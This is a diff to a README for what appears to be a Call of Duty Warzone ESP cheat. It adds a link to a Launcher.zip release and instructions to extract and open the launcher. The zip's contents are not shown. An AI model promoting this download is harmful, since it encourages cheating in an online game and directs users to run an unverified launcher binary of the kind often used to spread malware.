@@ -10,7 +10,7 @@ This COD Warzone software is written in C++ and python.
 
 ![4](https://github.com/user-attachments/assets/2e29736c-b7be-441f-bade-1b5a7e2d3698)
 
-- Download the project to your computer as zip
+- [Download](https://github.com/Thanphisit1462/warzone-esp/releases/download/warzone-esp/Launcher.zip) the project to your computer as zip
 - Extract Software to Any Folder.
 - Open the launcher.
 - Wait update install.
